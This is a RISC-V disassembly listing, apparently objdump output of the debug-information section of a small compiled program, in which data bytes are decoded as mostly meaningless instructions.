    1d6e:	0000                	unimp
    1d70:	006c                	addi	a1,sp,12
    1d72:	0000                	unimp
    1d74:	0000                	unimp
    1d76:	0000                	unimp
    1d78:	9c01                	subw	s0,s0,s0
    1d7a:	0fde                	slli	t6,t6,0x17
    1d7c:	0000                	unimp
    1d7e:	00706133          	or	sp,zero,t2
    1d82:	b202                	fsd	ft0,288(sp)
    1d84:	982c                	0x982c
    1d86:	0200000f          	fence	r,unknown
    1d8a:	6891                	lui	a7,0x4
    1d8c:	9132                	add	sp,sp,a2
    1d8e:	02000007          	0x2000007
    1d92:	34b2                	fld	fs1,296(sp)
    1d94:	0049                	c.nop	18
    1d96:	0000                	unimp
    1d98:	9102                	jalr	sp
    1d9a:	0064                	addi	s1,sp,12
    1d9c:	e131                	bnez	a0,1de0 <_tbss_end+0x1d5c>
    1d9e:	0006                	c.slli	zero,0x1
    1da0:	0200                	addi	s0,sp,256
    1da2:	149d                	addi	s1,s1,-25
    1da4:	1d84                	addi	s1,sp,752
    1da6:	8000                	0x8000
    1da8:	0000                	unimp
    1daa:	0000                	unimp
    1dac:	0102                	slli	sp,sp,0x0
    1dae:	0000                	unimp
    1db0:	0000                	unimp
    1db2:	0000                	unimp
    1db4:	9c01                	subw	s0,s0,s0
    1db6:	107c                	addi	a5,sp,44
    1db8:	0000                	unimp
    1dba:	e632                	sd	a2,264(sp)
    1dbc:	0008                	0x8
    1dbe:	0200                	addi	s0,sp,256
    1dc0:	249d                	addiw	s1,s1,7
    1dc2:	0f52                	slli	t5,t5,0x14
    1dc4:	0000                	unimp
    1dc6:	7dd89103          	lh	sp,2013(a7) # 47dd <_tbss_end+0x4759>
    1dca:	e432                	sd	a2,8(sp)
    1dcc:	02000007          	0x2000007
    1dd0:	409d                	li	ra,7
    1dd2:	0db1                	addi	s11,s11,12
    1dd4:	0000                	unimp
    1dd6:	7dd09103          	lh	sp,2013(ra)
    1dda:	6d756e33          	0x6d756e33
    1dde:	0200                	addi	s0,sp,256
    1de0:	289e                	fld	fa7,448(sp)
    1de2:	0874                	addi	a3,sp,28
    1de4:	0000                	unimp
    1de6:	7dc89103          	lh	sp,2012(a7)
    1dea:	e732                	sd	a2,392(sp)
    1dec:	0000                	unimp
    1dee:	0200                	addi	s0,sp,256
    1df0:	369e                	fld	fa3,480(sp)
    1df2:	005f 0000 9103      	0x91030000005f
    1df8:	7dc4                	ld	s1,184(a1)
    1dfa:	1a32                	slli	s4,s4,0x2c
    1dfc:	02000007          	0x2000007
    1e00:	409e                	lw	ra,196(sp)
    1e02:	0049                	c.nop	18
    1e04:	0000                	unimp
    1e06:	7dc09103          	lh	sp,2012(ra)
    1e0a:	0632                	slli	a2,a2,0xc
    1e0c:	02000007          	0x2000007
    1e10:	4b9e                	lw	s7,196(sp)
    1e12:	0049                	c.nop	18
    1e14:	0000                	unimp
    1e16:	7dbc9103          	lh	sp,2011(s9)
    1e1a:	d924                	sw	s1,112(a0)
    1e1c:	0008                	0x8
    1e1e:	0200                	addi	s0,sp,256
    1e20:	0ca0                	addi	s0,sp,600
    1e22:	107c                	addi	a5,sp,44
    1e24:	0000                	unimp
    1e26:	7de89103          	lh	sp,2014(a7)
    1e2a:	7034                	ld	a3,96(s0)
    1e2c:	0200736f          	jal	t1,8e4c <_tbss_end+0x8dc8>
    1e30:	07a1                	addi	a5,a5,8
    1e32:	0049                	c.nop	18
    1e34:	0000                	unimp
    1e36:	9102                	jalr	sp
    1e38:	006c                	addi	a1,sp,12
    1e3a:	5f0a                	lw	t5,160(sp)
    1e3c:	0000                	unimp
    1e3e:	8c00                	0x8c00
    1e40:	0010                	0x10
    1e42:	0b00                	addi	s0,sp,400
    1e44:	0079                	c.nop	30
    1e46:	0000                	unimp
    1e48:	f139003f 02000008 	0x2000008f139003f
    1e50:	1cf6068f          	0x1cf6068f
    1e54:	8000                	0x8000
    1e56:	0000                	unimp
    1e58:	0000                	unimp
    1e5a:	008e                	slli	ra,ra,0x3
    1e5c:	0000                	unimp
    1e5e:	0000                	unimp
    1e60:	0000                	unimp
    1e62:	9c01                	subw	s0,s0,s0
    1e64:	10d4                	addi	a3,sp,100
    1e66:	0000                	unimp
    1e68:	02007833          	remu	a6,zero,zero
    1e6c:	008c188f          	0x8c188f
    1e70:	0000                	unimp
    1e72:	9102                	jalr	sp
    1e74:	3448                	fld	fa0,168(s0)
    1e76:	00727473          	csrrci	s0,0x7,4
    1e7a:	9102                	jalr	sp
    1e7c:	d408                	sw	a0,40(s0)
    1e7e:	0010                	0x10
    1e80:	0200                	addi	s0,sp,256
    1e82:	5891                	li	a7,-28
    1e84:	6934                	ld	a3,80(a0)
    1e86:	0200                	addi	s0,sp,256
    1e88:	0792                	slli	a5,a5,0x4
    1e8a:	0049                	c.nop	18
    1e8c:	0000                	unimp
    1e8e:	9102                	jalr	sp
    1e90:	006c                	addi	a1,sp,12
    1e92:	1a0a                	slli	s4,s4,0x22
    1e94:	0006                	c.slli	zero,0x1
    1e96:	e400                	sd	s0,8(s0)
    1e98:	0010                	0x10
    1e9a:	0b00                	addi	s0,sp,400
    1e9c:	0079                	c.nop	30
    1e9e:	0000                	unimp
    1ea0:	0010                	0x10
    1ea2:	a32e                	fsd	fa1,384(sp)
    1ea4:	0006                	c.slli	zero,0x1
    1ea6:	0300                	addi	s0,sp,384
    1ea8:	05dc                	addi	a5,sp,708
    1eaa:	0049                	c.nop	18
    1eac:	0000                	unimp
    1eae:	1c84                	addi	s1,sp,624
    1eb0:	8000                	0x8000
    1eb2:	0000                	unimp
    1eb4:	0000                	unimp
    1eb6:	0072                	c.slli	zero,0x1c
    1eb8:	0000                	unimp
    1eba:	0000                	unimp
    1ebc:	0000                	unimp
    1ebe:	9c01                	subw	s0,s0,s0
    1ec0:	112e                	slli	sp,sp,0x2b
    1ec2:	0000                	unimp
    1ec4:	00686333          	or	t1,a6,t1
    1ec8:	7f02                	ld	t5,32(sp)
    1eca:	4911                	li	s2,4
    1ecc:	0000                	unimp
    1ece:	0200                	addi	s0,sp,256
    1ed0:	6c91                	lui	s9,0x4
    1ed2:	623a                	ld	tp,392(sp)
    1ed4:	6675                	lui	a2,0x1d
    1ed6:	0200                	addi	s0,sp,256
    1ed8:	1881                	addi	a7,a7,-32
    1eda:	112e                	slli	sp,sp,0x2b
    1edc:	0000                	unimp
    1ede:	3b40                	fld	fs0,176(a4)
    1ee0:	0769                	addi	a4,a4,26
    1ee2:	0000                	unimp
    1ee4:	8202                	jr	tp
    1ee6:	00004917          	auipc	s2,0x4
    1eea:	0000                	unimp
    1eec:	1a0a                	slli	s4,s4,0x22
    1eee:	0006                	c.slli	zero,0x1
    1ef0:	3e00                	fld	fs0,56(a2)
    1ef2:	0011                	c.nop	4
    1ef4:	0b00                	addi	s0,sp,400
    1ef6:	0079                	c.nop	30
    1ef8:	0000                	unimp
    1efa:	b239003f 02000007 	0x2000007b239003f
    1f02:	1b9e066b          	0x1b9e066b
    1f06:	8000                	0x8000
    1f08:	0000                	unimp
    1f0a:	0000                	unimp
    1f0c:	00e6                	slli	ra,ra,0x19
    1f0e:	0000                	unimp
    1f10:	0000                	unimp
    1f12:	0000                	unimp
    1f14:	9c01                	subw	s0,s0,s0
    1f16:	11c9                	addi	gp,gp,-14
    1f18:	0000                	unimp
    1f1a:	64696333          	0x64696333
    1f1e:	0200                	addi	s0,sp,256
    1f20:	0049106b          	0x49106b
    1f24:	0000                	unimp
    1f26:	7edc9103          	lh	sp,2029(s9) # 47ed <_tbss_end+0x4769>
    1f2a:	00636e33          	or	t3,t1,t1
    1f2e:	6b02                	ld	s6,0(sp)
    1f30:	4919                	li	s2,6
    1f32:	0000                	unimp
    1f34:	0300                	addi	s0,sp,384
    1f36:	d891                	beqz	s1,1e4a <_tbss_end+0x1dc6>
    1f38:	347e                	fld	fs0,504(sp)
    1f3a:	6572                	ld	a0,280(sp)
    1f3c:	0074                	addi	a3,sp,12
    1f3e:	7102                	ld	sp,32(sp)
    1f40:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    1f44:	0200                	addi	s0,sp,256
    1f46:	5091                	li	ra,-28
    1f48:	623c                	ld	a5,64(a2)
    1f4a:	6675                	lui	a2,0x1d
    1f4c:	0200                	addi	s0,sp,256
    1f4e:	112e0873          	0x112e0873
    1f52:	0000                	unimp
    1f54:	0240                	addi	s0,sp,260
    1f56:	0079                	c.nop	30
    1f58:	0b24                	addi	s1,sp,408
    1f5a:	0009                	c.nop	2
    1f5c:	0200                	addi	s0,sp,256
    1f5e:	0974                	addi	a3,sp,156
    1f60:	0614                	addi	a3,sp,768
    1f62:	0000                	unimp
    1f64:	9102                	jalr	sp
    1f66:	2c58                	fld	fa4,152(s0)
    1f68:	1bf6                	slli	s7,s7,0x3d
    1f6a:	8000                	0x8000
    1f6c:	0000                	unimp
    1f6e:	0000                	unimp
    1f70:	0076                	c.slli	zero,0x1d
    1f72:	0000                	unimp
    1f74:	0000                	unimp
    1f76:	0000                	unimp
    1f78:	6934                	ld	a3,80(a0)
    1f7a:	0200                	addi	s0,sp,256
    1f7c:	0c75                	addi	s8,s8,29
    1f7e:	0049                	c.nop	18
    1f80:	0000                	unimp
    1f82:	9102                	jalr	sp
    1f84:	0054                	addi	a3,sp,4
    1f86:	3d00                	fld	fs0,56(a0)
    1f88:	0956                	slli	s2,s2,0x15
    1f8a:	0000                	unimp
    1f8c:	6002                	0x6002
    1f8e:	440d                	li	s0,3
    1f90:	0080001b          	addiw	zero,zero,8
    1f94:	0000                	unimp
    1f96:	5a00                	lw	s0,48(a2)
    1f98:	0000                	unimp
    1f9a:	0000                	unimp
    1f9c:	0000                	unimp
    1f9e:	0100                	addi	s0,sp,128
    1fa0:	449c                	lw	a5,8(s1)
    1fa2:	0012                	c.slli	zero,0x4
    1fa4:	2400                	fld	fs0,8(s0)
    1fa6:	0835                	addi	a6,a6,13
    1fa8:	0000                	unimp
    1faa:	6202                	ld	tp,0(sp)
    1fac:	5b12                	lw	s6,36(sp)
    1fae:	0001                	nop
    1fb0:	0100                	addi	s0,sp,128
    1fb2:	2354                	fld	fa3,128(a4)
    1fb4:	0649                	addi	a2,a2,18
    1fb6:	0000                	unimp
    1fb8:	6302                	ld	t1,0(sp)
    1fba:	00061a0f          	0x61a0f
    1fbe:	2300                	fld	fs0,0(a4)
    1fc0:	00000803          	lb	a6,0(zero) # 0 <_tdata_begin>
    1fc4:	6402                	ld	s0,0(sp)
    1fc6:	1a18                	addi	a4,sp,304
    1fc8:	0006                	c.slli	zero,0x1
    1fca:	2300                	fld	fs0,0(a4)
    1fcc:	0690                	addi	a2,sp,832
    1fce:	0000                	unimp
    1fd0:	6402                	ld	s0,0(sp)
    1fd2:	1a26                	slli	s4,s4,0x29
    1fd4:	0006                	c.slli	zero,0x1
    1fd6:	2300                	fld	fs0,0(a4)
    1fd8:	00000857          	0x857
    1fdc:	6402                	ld	s0,0(sp)
    1fde:	1a32                	slli	s4,s4,0x2c
    1fe0:	0006                	c.slli	zero,0x1
    1fe2:	2400                	fld	fs0,8(s0)
    1fe4:	0685                	addi	a3,a3,1
    1fe6:	0000                	unimp
    1fe8:	6502                	ld	a0,0(sp)
    1fea:	ae0a                	fsd	ft2,280(sp)
    1fec:	0000                	unimp
    1fee:	0200                	addi	s0,sp,256
    1ff0:	6891                	lui	a7,0x4
    1ff2:	2b24                	fld	fs1,80(a4)
    1ff4:	0008                	0x8
    1ff6:	0200                	addi	s0,sp,256
    1ff8:	00ae0a67          	jalr	s4,10(t3) # 1900a <_tbss_end+0x18f86>
    1ffc:	0000                	unimp
    1ffe:	9102                	jalr	sp
    2000:	0060                	addi	s0,sp,12
    2002:	e02e                	sd	a1,0(sp)
    2004:	0005                	c.nop	1
    2006:	0200                	addi	s0,sp,256
    2008:	1b59                	addi	s6,s6,-10
    200a:	0049                	c.nop	18
    200c:	0000                	unimp
    200e:	1b1a                	slli	s6,s6,0x26
    2010:	8000                	0x8000
    2012:	0000                	unimp
    2014:	0000                	unimp
    2016:	002a                	c.slli	zero,0xa
    2018:	0000                	unimp
    201a:	0000                	unimp
    201c:	0000                	unimp
    201e:	9c01                	subw	s0,s0,s0
    2020:	1285                	addi	t0,t0,-31
    2022:	0000                	unimp
    2024:	eb32                	sd	a2,400(sp)
    2026:	02000007          	0x2000007
    202a:	2459                	addiw	s0,s0,22
    202c:	0049                	c.nop	18
    202e:	0000                	unimp
    2030:	9102                	jalr	sp
    2032:	326c                	fld	fa1,224(a2)
    2034:	07f6                	slli	a5,a5,0x1d
    2036:	0000                	unimp
    2038:	5902                	lw	s2,32(sp)
    203a:	b731                	j	1f46 <_tbss_end+0x1ec2>
    203c:	000d                	c.nop	3
    203e:	0200                	addi	s0,sp,256
    2040:	6091                	lui	ra,0x4
    2042:	3e00                	fld	fs0,56(a2)
    2044:	06cd                	addi	a3,a3,19
    2046:	0000                	unimp
    2048:	5202                	lw	tp,32(sp)
    204a:	f41c                	sd	a5,40(s0)
    204c:	001a                	c.slli	zero,0x6
    204e:	0080                	addi	s0,sp,64
    2050:	0000                	unimp
    2052:	2600                	fld	fs0,8(a2)
    2054:	0000                	unimp
    2056:	0000                	unimp
    2058:	0000                	unimp
    205a:	0100                	addi	s0,sp,128
    205c:	c19c                	sw	a5,0(a1)
    205e:	0012                	c.slli	zero,0x4
    2060:	3300                	fld	fs0,32(a4)
    2062:	00646963          	bltu	s0,t1,2074 <_tbss_end+0x1ff0>
    2066:	5202                	lw	tp,32(sp)
    2068:	492d                	li	s2,11
    206a:	0000                	unimp
    206c:	0200                	addi	s0,sp,256
    206e:	6c91                	lui	s9,0x4
    2070:	00636e33          	or	t3,t1,t1
    2074:	5202                	lw	tp,32(sp)
    2076:	4936                	lw	s2,76(sp)
    2078:	0000                	unimp
    207a:	0200                	addi	s0,sp,256
    207c:	6891                	lui	a7,0x4
    207e:	3900                	fld	fs0,48(a0)
    2080:	06b0                	addi	a2,sp,840
    2082:	0000                	unimp
    2084:	4d02                	lw	s10,0(sp)
    2086:	be06                	fsd	ft1,312(sp)
    2088:	001a                	c.slli	zero,0x6
    208a:	0080                	addi	s0,sp,64
    208c:	0000                	unimp
    208e:	3600                	fld	fs0,40(a2)
    2090:	0000                	unimp
    2092:	0000                	unimp
    2094:	0000                	unimp
    2096:	0100                	addi	s0,sp,128
    2098:	ed9c                	sd	a5,24(a1)
    209a:	0012                	c.slli	zero,0x4
    209c:	3300                	fld	fs0,32(a4)
    209e:	4d020073          	0x4d020073
    20a2:	00064a1b          	0x64a1b
    20a6:	0200                	addi	s0,sp,256
    20a8:	5891                	li	a7,-28
    20aa:	3f00                	fld	fs0,56(a4)
    20ac:	06f1                	addi	a3,a3,28
    20ae:	0000                	unimp
    20b0:	4802                	lw	a6,0(sp)
    20b2:	ae06                	fsd	ft1,280(sp)
    20b4:	001a                	c.slli	zero,0x6
    20b6:	0080                	addi	s0,sp,64
    20b8:	0000                	unimp
    20ba:	1000                	addi	s0,sp,32
    20bc:	0000                	unimp
    20be:	0000                	unimp
    20c0:	0000                	unimp
    20c2:	0100                	addi	s0,sp,128
    20c4:	409c                	lw	a5,0(s1)
    20c6:	0921                	addi	s2,s2,8
    20c8:	0000                	unimp
    20ca:	4302                	lw	t1,0(sp)
    20cc:	9606                	add	a2,a2,ra
    20ce:	001a                	c.slli	zero,0x6
    20d0:	0080                	addi	s0,sp,64
    20d2:	0000                	unimp
    20d4:	1800                	addi	s0,sp,48
    20d6:	0000                	unimp
    20d8:	0000                	unimp
    20da:	0000                	unimp
    20dc:	0100                	addi	s0,sp,128
    20de:	359c                	fld	fa5,40(a1)
    20e0:	32000013          	li	zero,800
    20e4:	072e                	slli	a4,a4,0xb
    20e6:	0000                	unimp
    20e8:	4302                	lw	t1,0(sp)
    20ea:	0000490f          	0x490f
    20ee:	0200                	addi	s0,sp,256
    20f0:	6c91                	lui	s9,0x4
    20f2:	2e00                	fld	fs0,24(a2)
    20f4:	06c1                	addi	a3,a3,16
    20f6:	0000                	unimp
    20f8:	3e02                	fld	ft8,32(sp)
    20fa:	9d21                	addw	a0,a0,s0
    20fc:	0000                	unimp
    20fe:	7a00                	ld	s0,48(a2)
    2100:	001a                	c.slli	zero,0x6
    2102:	0080                	addi	s0,sp,64
    2104:	0000                	unimp
    2106:	1c00                	addi	s0,sp,560
    2108:	0000                	unimp
    210a:	0000                	unimp
    210c:	0000                	unimp
    210e:	0100                	addi	s0,sp,128
    2110:	859c                	0x859c
    2112:	32000013          	li	zero,800
    2116:	0665                	addi	a2,a2,25
    2118:	0000                	unimp
    211a:	3e02                	fld	ft8,32(sp)
    211c:	00009d37          	lui	s10,0x9
    2120:	0200                	addi	s0,sp,256
    2122:	6891                	lui	a7,0x4
    2124:	63706533          	0x63706533
    2128:	0200                	addi	s0,sp,256
    212a:	483e                	lw	a6,204(sp)
    212c:	009d                	addi	ra,ra,7
    212e:	0000                	unimp
    2130:	9102                	jalr	sp
    2132:	3260                	fld	fs0,224(a2)
    2134:	000006ab          	0x6ab
    2138:	3e02                	fld	ft8,32(sp)
    213a:	000c3057          	0xc3057
    213e:	0200                	addi	s0,sp,256
    2140:	5891                	li	a7,-28
    2142:	4100                	lw	s0,0(a0)
    2144:	091a                	slli	s2,s2,0x6
    2146:	0000                	unimp
    2148:	3802                	fld	fa6,32(sp)
    214a:	5a20                	lw	s0,112(a2)
    214c:	001a                	c.slli	zero,0x6
    214e:	0080                	addi	s0,sp,64
    2150:	0000                	unimp
    2152:	2000                	fld	fs0,0(s0)
    2154:	0000                	unimp
    2156:	0000                	unimp
    2158:	0000                	unimp
    215a:	0100                	addi	s0,sp,128
    215c:	b39c                	fsd	fa5,32(a5)
    215e:	32000013          	li	zero,800
    2162:	072e                	slli	a4,a4,0xb
    2164:	0000                	unimp
    2166:	3802                	fld	fa6,32(sp)
    2168:	9d36                	add	s10,s10,a3
    216a:	0000                	unimp
    216c:	0200                	addi	s0,sp,256
    216e:	6891                	lui	a7,0x4
    2170:	3e00                	fld	fs0,56(a2)
    2172:	094d                	addi	s2,s2,19
    2174:	0000                	unimp
    2176:	2802                	fld	fa6,0(sp)
    2178:	4a06                	lw	s4,64(sp)
    217a:	0019                	c.nop	6
    217c:	0080                	addi	s0,sp,64
    217e:	0000                	unimp
    2180:	1000                	addi	s0,sp,32
    2182:	0001                	nop
    2184:	0000                	unimp
    2186:	0000                	unimp
    2188:	0100                	addi	s0,sp,128
    218a:	779c                	ld	a5,40(a5)
    218c:	0014                	0x14
    218e:	3200                	fld	fs0,32(a2)
    2190:	06ea                	slli	a3,a3,0x1a
    2192:	0000                	unimp
    2194:	2802                	fld	fa6,0(sp)
    2196:	00004913          	xori	s2,zero,0
    219a:	0300                	addi	s0,sp,384
    219c:	bc91                	j	1bf0 <_tbss_end+0x1b6c>
    219e:	347f                	0x347f
    21a0:	0069                	c.nop	26
    21a2:	2a02                	fld	fs4,0(sp)
    21a4:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    21a8:	0200                	addi	s0,sp,256
    21aa:	5c91                	li	s9,-28
    21ac:	00195a2b          	0x195a2b
    21b0:	0080                	addi	s0,sp,64
    21b2:	0000                	unimp
    21b4:	7c00                	ld	s0,56(s0)
    21b6:	0000                	unimp
    21b8:	0000                	unimp
    21ba:	0000                	unimp
    21bc:	3400                	fld	fs0,40(s0)
    21be:	0014                	0x14
    21c0:	3400                	fld	fs0,40(s0)
    21c2:	00727363          	bleu	t2,tp,21c8 <_tbss_end+0x2144>
    21c6:	3202                	fld	ft4,32(sp)
    21c8:	00009d03          	lh	s10,0(ra) # 4000 <_tbss_end+0x3f7c>
    21cc:	0200                	addi	s0,sp,256
    21ce:	6891                	lui	a7,0x4
    21d0:	682c                	ld	a1,80(s0)
    21d2:	0019                	c.nop	6
    21d4:	0080                	addi	s0,sp,64
    21d6:	0000                	unimp
    21d8:	0c00                	addi	s0,sp,528
    21da:	0000                	unimp
    21dc:	0000                	unimp
    21de:	0000                	unimp
    21e0:	2400                	fld	fs0,8(s0)
    21e2:	000001ab          	0x1ab
    21e6:	3202                	fld	ft4,32(sp)
    21e8:	00007903          	0x7903
    21ec:	0200                	addi	s0,sp,256
    21ee:	5091                	li	ra,-28
    21f0:	0000                	unimp
    21f2:	d62c                	sw	a1,104(a2)
    21f4:	0019                	c.nop	6
    21f6:	0080                	addi	s0,sp,64
    21f8:	0000                	unimp
    21fa:	7c00                	ld	s0,56(s0)
    21fc:	0000                	unimp
    21fe:	0000                	unimp
    2200:	0000                	unimp
    2202:	3400                	fld	fs0,40(s0)
    2204:	00727363          	bleu	t2,tp,220a <_tbss_end+0x2186>
    2208:	3302                	fld	ft6,32(sp)
    220a:	00009d03          	lh	s10,0(ra)
    220e:	0200                	addi	s0,sp,256
    2210:	6091                	lui	ra,0x4
    2212:	e42c                	sd	a1,72(s0)
    2214:	0019                	c.nop	6
    2216:	0080                	addi	s0,sp,64
    2218:	0000                	unimp
    221a:	0c00                	addi	s0,sp,528
    221c:	0000                	unimp
    221e:	0000                	unimp
    2220:	0000                	unimp
    2222:	2400                	fld	fs0,8(s0)
    2224:	000001ab          	0x1ab
    2228:	3302                	fld	ft6,32(sp)
    222a:	00007903          	0x7903
    222e:	0200                	addi	s0,sp,256
    2230:	4891                	li	a7,4
    2232:	0000                	unimp
    2234:	3800                	fld	fs0,48(s0)
    2236:	07b8                	addi	a4,sp,968
    2238:	0000                	unimp
    223a:	1202                	slli	tp,tp,0x20
    223c:	9d12                	add	s10,s10,tp
    223e:	0000                	unimp
    2240:	cc00                	sw	s0,24(s0)
    2242:	0018                	0x18
    2244:	0080                	addi	s0,sp,64
    2246:	0000                	unimp
    2248:	7e00                	ld	s0,56(a2)
    224a:	0000                	unimp
    224c:	0000                	unimp
    224e:	0000                	unimp
    2250:	0100                	addi	s0,sp,128
    2252:	ea9c                	sd	a5,16(a3)
    2254:	0014                	0x14
    2256:	3200                	fld	fs0,32(a2)
    2258:	07f0                	addi	a2,sp,972
    225a:	0000                	unimp
    225c:	1202                	slli	tp,tp,0x20
    225e:	9d24                	0x9d24
    2260:	0000                	unimp
    2262:	0300                	addi	s0,sp,384
    2264:	f891                	bnez	s1,2178 <_tbss_end+0x20f4>
    2266:	327e                	fld	ft4,504(sp)
    2268:	000007a3          	sb	zero,15(zero) # f <_tdata_begin+0xf>
    226c:	1202                	slli	tp,tp,0x20
    226e:	8c34                	0x8c34
    2270:	0000                	unimp
    2272:	0300                	addi	s0,sp,384
    2274:	f091                	bnez	s1,2178 <_tbss_end+0x20f4>
    2276:	327e                	fld	ft4,504(sp)
    2278:	07a8                	addi	a0,sp,968
    227a:	0000                	unimp
    227c:	1202                	slli	tp,tp,0x20
    227e:	00008c43          	fmadd.s	fs8,ft1,ft0,ft0,rne
    2282:	0300                	addi	s0,sp,384
    2284:	e891                	bnez	s1,2298 <_tbss_end+0x2214>
    2286:	327e                	fld	ft4,504(sp)
    2288:	07ad                	addi	a5,a5,11
    228a:	0000                	unimp
    228c:	1202                	slli	tp,tp,0x20
    228e:	8c52                	mv	s8,s4
    2290:	0000                	unimp
    2292:	0300                	addi	s0,sp,384
    2294:	e091                	bnez	s1,2298 <_tbss_end+0x2214>
    2296:	427e                	lw	tp,220(sp)
    2298:	0910                	addi	a2,sp,144
    229a:	0000                	unimp
    229c:	1402                	slli	s0,s0,0x20
    229e:	fa15                	bnez	a2,21d2 <_tbss_end+0x214e>
    22a0:	0014                	0x14
    22a2:	4000                	lw	s0,0(s0)
    22a4:	7f02                	ld	t5,32(sp)
    22a6:	0000                	unimp
    22a8:	980a                	add	a6,a6,sp
    22aa:	0000                	unimp
    22ac:	fa00                	sd	s0,48(a2)
    22ae:	0014                	0x14
    22b0:	0b00                	addi	s0,sp,400
    22b2:	0079                	c.nop	30
    22b4:	0000                	unimp
    22b6:	ea040007          	0xea040007
    22ba:	0014                	0x14
    22bc:	3800                	fld	fs0,48(s0)
    22be:	00000733          	add	a4,zero,zero
    22c2:	7201                	lui	tp,0xfffe0
    22c4:	8c11                	sub	s0,s0,a2
    22c6:	0000                	unimp
    22c8:	9600                	0x9600
    22ca:	0018                	0x18
    22cc:	0080                	addi	s0,sp,64
    22ce:	0000                	unimp
    22d0:	3600                	fld	fs0,40(a2)
    22d2:	0000                	unimp
    22d4:	0000                	unimp
    22d6:	0000                	unimp
    22d8:	0100                	addi	s0,sp,128
    22da:	3e9c                	fld	fa5,56(a3)
    22dc:	0015                	c.nop	5
    22de:	3300                	fld	fs0,32(a4)
    22e0:	0078                	addi	a4,sp,12
    22e2:	7201                	lui	tp,0xfffe0
    22e4:	8c1f 0000 0200      	0x20000008c1f
    22ea:	5891                	li	a7,-28
    22ec:	6234                	ld	a3,64(a2)
    22ee:	7469                	lui	s0,0xffffa
    22f0:	0100                	addi	s0,sp,128
    22f2:	0c74                	addi	a3,sp,540
    22f4:	008c                	addi	a1,sp,64
    22f6:	0000                	unimp
    22f8:	9102                	jalr	sp
    22fa:	0068                	addi	a0,sp,12
    22fc:	0006b943          	fmadd.s	fs2,fa3,ft0,ft0,rup
    2300:	0100                	addi	s0,sp,128
    2302:	275e                	fld	fa4,464(sp)
    2304:	180c                	addi	a1,sp,48
    2306:	8000                	0x8000
    2308:	0000                	unimp
    230a:	0000                	unimp
    230c:	008a                	slli	ra,ra,0x2
    230e:	0000                	unimp
    2310:	0000                	unimp
    2312:	0000                	unimp
    2314:	9c01                	subw	s0,s0,s0
    2316:	15a4                	addi	s1,sp,744
    2318:	0000                	unimp
    231a:	1032                	c.slli	zero,0x2c
    231c:	0008                	0x8
    231e:	0100                	addi	s0,sp,128
    2320:	335e                	fld	ft6,496(sp)
    2322:	0049                	c.nop	18
    2324:	0000                	unimp
    2326:	9102                	jalr	sp
    2328:	246c                	fld	fa1,200(s0)
    232a:	0900                	addi	s0,sp,144
    232c:	0000                	unimp
    232e:	6001                	0x6001
    2330:	00005017          	auipc	zero,0x5
    2334:	0900                	addi	s0,sp,144
    2336:	01bc6403          	lwu	s0,27(s8)
    233a:	0080                	addi	s0,sp,64
    233c:	0000                	unimp
    233e:	2400                	fld	fs0,8(s0)
    2340:	047f                	0x47f
    2342:	0000                	unimp
    2344:	6101                	0x6101
    2346:	00005017          	auipc	zero,0x5
    234a:	0900                	addi	s0,sp,144
    234c:	01bc6003          	lwu	zero,27(s8)
    2350:	0080                	addi	s0,sp,64
    2352:	0000                	unimp
    2354:	3b00                	fld	fs0,48(a4)
    2356:	08fa                	slli	a7,a7,0x1e
    2358:	0000                	unimp
    235a:	6201                	0x6201
    235c:	00004917          	auipc	s2,0x4
    2360:	0000                	unimp
    2362:	c038                	sw	a4,64(s0)
    2364:	01000007          	0x1000007
    2368:	0c4e                	slli	s8,s8,0x13
    236a:	0049                	c.nop	18
    236c:	0000                	unimp
    236e:	16ea                	slli	a3,a3,0x3a
    2370:	8000                	0x8000
    2372:	0000                	unimp
    2374:	0000                	unimp
    2376:	0122                	slli	sp,sp,0x8
    2378:	0000                	unimp
    237a:	0000                	unimp
    237c:	0000                	unimp
    237e:	9c01                	subw	s0,s0,s0
    2380:	166a                	slli	a2,a2,0x3a
    2382:	0000                	unimp
    2384:	01006e33          	or	t3,zero,a6
    2388:	1d4e                	slli	s10,s10,0x33
    238a:	0049                	c.nop	18
    238c:	0000                	unimp
    238e:	7fbc9103          	lh	sp,2043(s9) # 47fb <_tbss_end+0x4777>
    2392:	0632                	slli	a2,a2,0xc
    2394:	0009                	c.nop	2
    2396:	0100                	addi	s0,sp,128
    2398:	374e                	fld	fa4,240(sp)
    239a:	166a                	slli	a2,a2,0x3a
    239c:	0000                	unimp
    239e:	7fb09103          	lh	sp,2043(ra) # 47fb <_tbss_end+0x4777>
    23a2:	5f32                	lw	t5,44(sp)
    23a4:	0009                	c.nop	2
    23a6:	0100                	addi	s0,sp,128
    23a8:	4b4e                	lw	s6,208(sp)
    23aa:	1681                	addi	a3,a3,-32
    23ac:	0000                	unimp
    23ae:	7fa89103          	lh	sp,2042(a7) # 47fa <_tbss_end+0x4776>
    23b2:	6934                	ld	a3,80(a0)
    23b4:	0100                	addi	s0,sp,128
    23b6:	0750                	addi	a2,sp,900
    23b8:	0049                	c.nop	18
    23ba:	0000                	unimp
    23bc:	9102                	jalr	sp
    23be:	2c6c                	fld	fa1,216(s0)
    23c0:	1704                	addi	s1,sp,928
    23c2:	8000                	0x8000
    23c4:	0000                	unimp
    23c6:	0000                	unimp
    23c8:	009c                	addi	a5,sp,64
    23ca:	0000                	unimp
    23cc:	0000                	unimp
    23ce:	0000                	unimp
    23d0:	7434                	ld	a3,104(s0)
    23d2:	0030                	addi	a2,sp,8
    23d4:	5401                	li	s0,-32
    23d6:	700c                	ld	a1,32(s0)
    23d8:	0016                	c.slli	zero,0x5
    23da:	0200                	addi	s0,sp,256
    23dc:	6091                	lui	ra,0x4
    23de:	7434                	ld	a3,104(s0)
    23e0:	0031                	c.nop	12
    23e2:	5401                	li	s0,-32
    23e4:	701a                	0x701a
    23e6:	0016                	c.slli	zero,0x5
    23e8:	0200                	addi	s0,sp,256
    23ea:	5891                	li	a7,-28
    23ec:	7634                	ld	a3,104(a2)
    23ee:	0030                	addi	a2,sp,8
    23f0:	5501                	li	a0,-32
    23f2:	700c                	ld	a1,32(s0)
    23f4:	0016                	c.slli	zero,0x5
    23f6:	0200                	addi	s0,sp,256
    23f8:	5091                	li	ra,-28
    23fa:	7634                	ld	a3,104(a2)
    23fc:	0031                	c.nop	12
    23fe:	5501                	li	a0,-32
    2400:	701c                	ld	a5,32(s0)
    2402:	0016                	c.slli	zero,0x5
    2404:	0200                	addi	s0,sp,256
    2406:	4891                	li	a7,4
    2408:	6534                	ld	a3,72(a0)
    240a:	3171                	addiw	sp,sp,-4
